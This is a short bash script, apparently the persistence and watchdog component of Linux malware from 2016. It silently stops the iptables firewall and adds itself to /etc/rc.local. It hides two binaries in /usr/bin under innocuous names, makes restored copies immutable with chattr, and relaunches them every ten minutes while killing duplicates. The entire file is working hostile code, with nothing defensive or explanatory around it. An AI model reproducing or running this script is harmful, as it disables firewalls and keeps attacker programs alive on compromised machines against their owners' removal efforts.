#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                by:libstdci
#                2016-03-10
service iptables stop > /dev/null 2>&1 &
host_dir=`pwd`
if [ "sh $host_dir/ceurnadi &" = "$(cat /etc/rc.local | grep $host_dir/ceurnadi | grep -v grep)" ]; then
    echo ""
else
    echo "sh $host_dir/ceurnadi &" >> /etc/rc.local
fi
cp libstdci /usr/bin/ched
cp ceurnadi /usr/bin/aeude
while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "$host_dir/libstdci" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "$host_dir/libstdci" ]; then
            if [ -f "/usr/bin/ched" ]; then
                cp /usr/bin/ched $host_dir/libstdci
                chmod 755 ./libstdci
				chattr +i libstdci
            else
			    echo "No weeget"
			fi
        fi
        ./libstdci &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "$host_dir/libstdci" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "$host_dir/ceurnadi" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "$host_dir/ceurnadi" ]; then
            if [ -f "/usr/bin/aeude" ]; then
                cp /usr/bin/aeude $host_dir/ceurnadi
				chattr +i ceurnadi
            else
                echo "No weeget"
            fi
        fi
    $host_dir/ceurnadi &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "$host_dir/ceurnadi" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi
    sleep 600
done

